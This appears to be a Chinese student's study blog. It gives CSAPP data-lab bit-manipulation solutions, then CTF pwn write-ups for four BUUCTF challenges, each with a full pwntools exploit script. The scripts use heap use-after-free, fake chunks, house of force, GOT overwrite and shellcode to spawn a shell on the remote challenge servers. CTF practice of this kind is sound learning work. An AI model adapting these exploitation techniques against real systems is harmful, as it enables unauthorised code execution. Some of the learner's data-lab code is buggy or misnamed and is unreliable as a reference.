csapp的实验确实有点东西，感觉学到了不少东西
数据实验
## 前置知识： ##
	~ ：非运算符 如 ~0010 = 1101
	& ：与运算符 如 0010 & 1110 = 0010
	| ：或运算符 如 0010 | 1110 = 1110
	^ ：异或运算符 如 1001 ^ 0110 = 1111
	! ：逻辑非运算符 如 !0 = 1 !1 = 0
	&&:逻辑与运算符 如 1 && 1 = 1 1 && 0 =0
	||：逻辑或运算符 如 1 || 0 = 1 
	>>: 右移运算符 逻辑右移(不考虑符号位) 如0100 >> 2 = 0001
				  算术右移(考虑符号位，是什么补什么) 如 1001 >> 2 = 1110
	<<: 左移运算符 如 1001 1001 << = 0110 0100

## 浮点数 ##
计算方法float=(-1)^s * M * 2^E 
float的表示方法，1个二进制位表示符号s，8个二进制位表示阶码(e为无符号数)，23个二进制位表示小数部分(f)
(规格化数，即e!=0,且e!=255)E = e - Bias		Bias =2^(k-1) - 1,
举个栗子，e 为 1111  1110 ,此时 Bias = 127, e = 254 - 127 = 127
假设 M 为 1 00 0000 0000 0000 0000 0000
M = 1 + f ，f部分为f = 1 * 2^-1  …… + 0 = 0.5
用小数点表示 M 即 1.100000……000
(非规格化数)E = 1 - Bias, M = f = 1


### 1.xor ###
题目要求只是用 ~ 和 & 来实现 异或 即 ^, 本质就是相同位取1、不同位取0，而每一位又只有0或1，
感觉我是试出来的
如下
即
```c
int bitXor(int x, int y) {
  return ~(~(~x&y)&~(~y&x));

// 1111 0011 1111 x
// 1001 1000 0001 y

// 0000 1100 0000 ~x
// 0110 0111 1110 ~y

// 0000 1000 0000 ~x&y
// 0110 0011 1110 ~y&x

// 1111 0111 1111 ~(~x&y)
// 1001 1100 0001 ~(~y&x)

// 1001 0100 0001
// 0110 1011 1110 reuslt
//~(~(~x&y)&~(~y&x))
}
```

### 2.返回最小二进制整数 ###
最小二进制整数即符号位为1，其它位都为0，int占4个byte，一个byte占8个二进制位
```c
int tmin(void) {
  return 1<<31;
}
```

### 3.判断x是否位最大二进制整数 ###
最大二进制整数即上一个结果取反，题目要求是返回1，否返回0
思路：0x7fffffff + 1 = ~ 0x7fffffff,有个特例是x为-1的时候，!(!(x^-1))这个为特判
```c
int isTmax(int x) {
  return !((x+1)^(~x))&!(!(x^-1));
}
```

### 4.所有奇数位为1返回1，否则返回0 ###
案例为：allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
思路:先得到0xaaaa，然后再异或两次就可以了，一开始没注意<< 和 + 的优先级，一直错了
```c
int allOddBits(int x) {
  int temp=0xaa+(0xaa<<8);//0xaaaa
  return !((x&temp)^temp)&!(((x>>16)&temp)^temp);
}
```

### 5.返回相反数 ###
1的二进制形式是0000 0001 -1的二进制形式1111 1111,从 x + -x -1 == 1111 1111(2) 可以直接看出来 -x = ~ x + 1 
```c
int negate(int x) {
  return ~x+1;
}
```

### 6.若 0x30<=x<=0x39返回1，否则返回0 ###
9=(1001)(2)
3=(0011)(2)
思路:先判断0x30和0x39中相同的3，即0011，此然后再判断后一位，后一位有两种情况：
1.1xxx --> !(x>>1&1|x>>2&1)
2.0xxx --> !(x>>3&1)
```c
int isAsciiDigit(int x) {
  return !(x>>4^3)&(!(x>>3&1)|!(x>>1&1|x>>2&1));
}
```

### 7.使用运算符表示？： ###
例子：conditional(2,4,5) = 4
思路:突然想到一个特别关键的点，然后就做出来了，1往左移31位，得到最小整数，再往右移，此时因为
符号位为1，再往右移31位得到的就是-1,而先往左移，再往右移0，还是0，这样就可以很好的表示* 0 和* 1
如下
```c
int conditional(int x, int y, int z) {
  x=!x;
  x=x<<31;
  x=x>>31;
  return (y&~x)+(z&x);
}
```

### 8.x<=y返回1，否则返回0 ###
两种情况：
	1.x==y
	2.x!=y 这种情况有好几种判断，最开始是总的1判断，用y-x判断符号位(理论上y>x,y-x,的符号位为1，但是0-0x80000000符号位为1，所以要加一个判断正负)
	此时还有一种情况没考虑到，就是y<0,x>0时，再加一个判断条件就可以了
```c
int isLessOrEqual(int x, int y) {
   int temp=!(x^y)&1;//判断相等 
   	printf("%d ",temp);
    temp=temp | !((y+(~x)+1)>>31);//判断大小
    printf("%d ",temp);
    temp=temp | ((x>>31)&~y>>31);//判断正负
   	printf("%d ",temp);
	temp=temp & !(y>>31&~(x>>31)&1);
	printf("%d ",temp);
   return temp;
}
```

### 9.实现!运算符 ###
原理是~ 0 + 1 = 0,0取相反数还是0，符号位还是0，而别的数符号位为1，0或1，1的组合
```c
int logicalNeg(int x) {
 return ((x>>31)&1|((~x+1)>>31)&1)^1;
}
```

### 10.返回x用补码表示的最小位数 ###
这个题我初步的思路是有了，但是怎么不超过Max ops，我没想到……
看c部分就很容易理解了
```c
int howManyBits(int x) {
	int s,c1,c2,c3,c4,c5,c6;
	int cnt = 0;	// 	计数
	s = (x>>31)&1;	//	符号位
	x = ((s<<31)>>31) ^ x; // 取反x
	s = !!(x>>16);	// 判断高16位是否有1，有则s为1
	c1 = s<<4;		// 若高16位有1，则低16位可以计数16
	x >>= c1;		// 右移将已经计数的位移除，c1若为0，则用折半的长度判断
	s = !!(x>>8);	// 用8位的长度去判断，有效位的个数计入c2
	c2 = s<<3;
	x >>= c2;
	s = !!(x>>4);	// 用4位的长度去判断，有效位的个数计入c3
	c3 = s<<2;
	x >>= c3;
	s = !!(x>>2);	// 用2位的长度去判断，有效位的个数计入c4
	c4 = s<<1;
	x >>= c4;
	s = !!(x>>1);	// 用1位的长度去判断，有效位的个数计入c5
	c5 = s;
	x >>= c5;
	c6 = !!x;		// 判断最低位是否为1
	cnt = c1+c2+c3+c4+c5+c6+1;	// 将每次获得的低位有效位相加，再加1位符号位
	return cnt;
}
```

### 11.返回2* f(浮点数) ###
这个题写了一两天人麻了，
关于浮点数，float的话，1位表正负(s)，8位表示阶码(e)，还有23位表示小数位(f)
* 2有三种情况:
	1.返回它本身，如NaN,0,1<<31……
	2.是e部分* 2
	3.小数位* 2(e部分为0)
```c
unsigned floatScale2(unsigned uf) {
  unsigned s=((uf>>31)<<31);
  unsigned v=(0x1ff)<<23;
  unsigned temp=uf<<1;
  temp=temp>>24;//temp 表示 e
  unsigned var=uf<<9;//var 表示 小数位
  if((temp==255&&(((var>>31)&1)==1||var==0))){
  		return uf;//判断NaN的情况，以及0x7f800000
  }
  else{
	  if(var==0){//小数位为0
	  	  if(temp==0) //判断1000   0000 …… 0000
			return uf;  
	  	  temp+=1;//*2
		  temp=temp<<23;
		  return temp|s;//符号位
      }
  	  else{
  	  	if(temp==0){//exp为0
			return 2*uf|s;//82
		}
  	  	return (((temp+1)<<23)+(var>>9))|s;//exp不为0,小数位不变
		}
  	  
  }
}
```

### 12.返回int(float) ###
感觉上面那个题能写出来，这个也能写出来
float返回int，主要就是超出范围，还有NaN，返回0x80000000,然后根据exp部分的大小计算就可以了
并且exp部分最大为(规范化数)，511，当 511 - 256 ( 2 * 7 - 1 ) >= 32 时，int就无法表达了，这时
需要返回0x80000000,而属于int范围中的数直接将temp转化成整数，大于127再算2^temp就可以了
```c
int floatScale2(unsigned uf) {
  unsigned s=uf>>31;
  unsigned v=(0x1ff)<<23;
  unsigned temp=uf<<1;
  temp=temp>>24;
  unsigned var=uf<<9;
  int re=temp;
  int count=0;
  int result=1;
  if(re==0)
	return 0;
  else{
  	if(re==255)
  		return 1<<31;
  	else{
  		re-=127;
  		if(re<0)
  		return 0;
		if(re>=32)
		return 1<<31;
  		while(re>0){
  			result*=2;
  			re--;
		  }
		  if(s==1){
		  	return result*-1;
		  }
		  else return result;
  		
	}
  }
}
```
### 13.返回x的x次方 ###
我理解的题目的意思是通过exp部分来实现2的x次方，但是x为负数返回0，感觉很奇怪，而且我本地还打不通，不能返回0
，太离谱了，思路很简单
```c
unsigned floatPower2(int x) {
    unsigned INF = 0xff << 23;
	int e = 127 + x;
	if (x < 0)
		return 0;
	if (e >= 255)
		return INF;
	return e << 23;
}
```

## buu ##

### 1.wustctf2020_easyfast ###
这个题思路很简单，只要把0x602090改为0就可以了，可以直接通过uaf和fastbinattack，在0x6020080处分配内存，但是这个地方理论上是分配不了的，因为大小为0x50,后一位是0,待解决
```python
from pwn import *
from LibcSearcher import *
from struct import pack
a=0
b=1
elf=ELF("./pwn")
libc=ELF("./libc-2.23.so")
context.os='linux'
context.arch='amd64'
#context.log_level='debug'
if(a==1):
	p=process("./pwn")
else:
	p=remote("node4.buuoj.cn",28425)

def allo(size):
	p.recvuntil("choice>\n")
	p.sendline("1")
	p.recvuntil("size>\n")
	p.sendline(str(size))

def free(index):
	p.recvuntil("choice>\n")
	p.sendline("2")
	p.recvuntil("index>\n")
	p.sendline(str(index))
	
def edit(index,content):
	p.recvuntil("choice>\n")
	p.sendline("3")
	p.recvuntil("index>\n")
	p.sendline(str(index))
	p.send(str(content))

#sys_ad=0x602090
sys_ad=0x4008A6
ad=0x602080
allo(0x40)#0
#allo(0x)
free(0)
edit(0,p64(ad))
allo(0x40)#1
allo(0x40)#2
edit(2,p64(0))

p.sendline("4")
p.interactive()
```

### 2.ciscn_2019_final_5 ###
这个题有点东西，从下午写到晚上才写出来，主要是犯的错太多了，一开始交互又写错了，浪费了好多时间
这个题中索引堆块是通过heap_array中堆地址的最后一位，edit函数中size则是根据idx
主要漏洞点在于
malloc函数
```c
if ( !result )
    {
      qword_6020E0[i] = v5;//v5=index | heap_ad 堆的起始地址位0x250 当index等于16的时候堆的地址,v5 = 0x260,可以伪造一个堆，再free，然后再得到这个堆改别的
      //堆的fd，就可以分配到heap_array(0x6020e0)处，之后就可以随便做了，一开始我没分配到heap_array,做了好久也没做出来
      result = i;
      dword_602180[i] = v2;
      break;
    }
```
free函数
```c
if ( result == v2 )
    {
      free((void *)(qword_6020E0[i] & 0xFFFFFFFFFFFFFFF0LL));
      qword_6020E0[i] = 0LL;
      dword_602180[i] = 0;
      result = puts("free success.\n");
      break;
    }
```
思路:先分配一个0x10的堆，然后内容为伪造的堆块的内容，此时再分配一个大堆块(可以覆盖到heap_array的大小)，然后free掉大的和伪造的，此时
再分配我们伪造的堆块的大小，就能得到伪造的堆块，此时再修改大堆块的fd为0x6020e0，后面的操作就比较常规了
```python
from pwn import *

p=remote("node4.buuoj.cn",28896)

elf = ELF("./pwn")
libc = ELF('./libc.so.6')

#context.log_level='debug'
def allo(idx,size,con):
	p.recvuntil("your choice: ")
	p.sendline("1")
	p.recvuntil("index: ")
	p.sendline(str(idx))
	p.recvuntil("size: ")
	p.sendline(str(size))
	p.recvuntil("content: ")
	p.send(con)

def free(idx):
	p.recvuntil("your choice: ")
	p.sendline("2")
	p.recvuntil("index: ")
	p.sendline(str(idx))

def edit(idx,con):
	p.recvuntil("your choice: ")
	p.sendline("3")
	p.recvuntil("index: ")
	p.sendline(str(idx))
	p.recvuntil("content: ")
	p.send(con)

allo(16,0x10,p64(0)+p64(0x51))
allo(1,0xc0,"aaaa")
free(0)
free(1)
allo(2,0x40,p64(0)+p64(0x41)+p64(0x6020e0))
allo(3,0xc0,"aaaa")
allo(4,0xc0,p64(elf.got["free"]&0xffffffffffffff10)+p64(elf.got["alarm"]|1)+p64(elf.got["atoi"])+p64(0)*17+p32(0x30)*8)

edit(0,p64(elf.plt["puts"])*2)
free(1)
ad=u64(p.recv(6).ljust(8,"\x00"))
log.info("ad: "+hex(ad))

libc_base=ad-libc.sym["alarm"]&0xffffffffffffff00
log.info("libc_base: "+hex(libc_base))


sys_ad=libc_base+libc.sym["system"]
log.info("sys_ad: "+hex(sys_ad))
edit(8,p64(sys_ad)*2)
#gdb.attach(p)
p.recvuntil("your choice: ")
p.sendline("/bin/sh\x00")
p.interactive()
```

### 3.wdb_2018_3rd_soEasy ###
一个简单的shellcode题，给了栈地址，直接ret过去就可以了
```python
from pwn import *
from LibcSearcher import *
from struct import pack
a=0
b=1
elf=ELF("./pwn")
libc=ELF("./libc-2.23.so")
context.os='linux'
context.arch='i386'
#context.log_level='debug'
if(a==1):
	p=process("./pwn")
else:
	p=remote("node4.buuoj.cn",27380)

p.recvuntil("gift->")
ad=int(p.recv(10),16)
log.info("ad: "+hex(ad))
payload=asm(shellcraft.sh())
payload=payload.ljust(0x48,"a")+"aaaa"+p64(ad)
p.recvuntil("do?\n")
#gdb.attach(p)
p.sendline(payload)
p.interactive()
```

### 4.bcloud_bctf_2016 ###
32位，有栈保护，可以改got表，没pie
这个题最主要的漏洞点在于这两个函数
```c
unsigned int sub_80487A1()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts("Input your name:");
  sub_804868D((int)s, 64, 10);//这个函数中有个=0截断
  v2 = (char *)malloc(0x40u);
  dword_804B0CC = (int)v2;
  strcpy(v2, s);
  sub_8048779(v2);
  return __readgsdword(0x14u) ^ v3;
}
```
这个函数中需要注意栈，s后面就是v2,我们在输入64个字符后，再创建的堆，又因为32位，在输出s的时候就可以泄露第一个堆的地址
第二个函数
```c
unsigned int sub_804884E()
{
  char s[64]; // [esp+1Ch] [ebp-9Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3[68]; // [esp+60h] [ebp-58h] BYREF
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(s, 0, 0x90u);
  puts("Org:");
  sub_804868D((int)s, 64, 10);
  puts("Host:");
  sub_804868D((int)v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)v2;
  dword_804B148 = (int)v4;
  strcpy(v4, v3);
  strcpy(v2, s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```
和第一个函数是一样的原理，v3可以覆盖top_chunk，之后就是比较常规的house of force
```python
from pwn import *
from LibcSearcher import *
from struct import pack
a=0
b=1
elf=ELF("./pwn")
libc=ELF("./libc-2.23.so")
context.os='linux'
context.arch='i386'
#context.log_level='debug'
if(a==1):
	p=process("./pwn")
else:
	p=remote("node4.buuoj.cn",26064)

def allo(size,con):
	p.recvuntil("option--->>\n")
	p.sendline("1")
	p.recvuntil(":\n")
	p.sendline(str(size))
	p.recvuntil(":\n")
	p.sendline(con)

def edit(idx,con):
	p.recvuntil("option--->>\n")
	p.sendline("3")
	p.recvuntil(":\n")
	p.sendline(str(idx))
	p.recvuntil(":\n")
	p.sendline(con)

def free(idx):
	p.recvuntil("option--->>\n")
	p.sendline("4")
	p.recvuntil(":\n")
	p.sendline(str(idx))
#a泄露libc
p.recvuntil("name:")
p.send("a"*64)
p.recvuntil("a"*64)
ad=u32(p.recv(4))
log.info("ad: "+hex(ad))
p.recvuntil("Org:")
p.send("a"*64)
p.recvuntil("Host:")
p.sendline(p32(0xffffffff))

#b house of force
top_chunk=ad+0xf8
offest=0x804B120-top_chunk-0x10
allo(8,"aaaa")
allo(8,"bbbb")
allo(offest,'')
allo(0x30,p32(elf.got["free"])+p32(elf.got["atoi"])+p32(elf.got["free"])+p32(elf.got["atoi"])+p32(elf.got["atoi"])+p32(elf.got["atoi"]))
edit(0,p32(elf.plt["puts"]))
#gdb.attach(p)
free(1)

ad=u32(p.recv(4))

libc=LibcSearcher("atoi",ad)
libc_base=ad-libc.dump("atoi")
sys_ad=libc_base=libc_base+libc.dump("system")

'''
libc_base=ad-libc.sym["atoi"]
sys_ad=libc_base+libc.sym["system"]
log.info("atoi_got: "+hex(elf.got["atoi"]))
log.info("sys_ad: "+hex(sys_ad))
'''
edit(3,p32(sys_ad))

p.sendline("/bin/sh\x00")
p.interactive()
```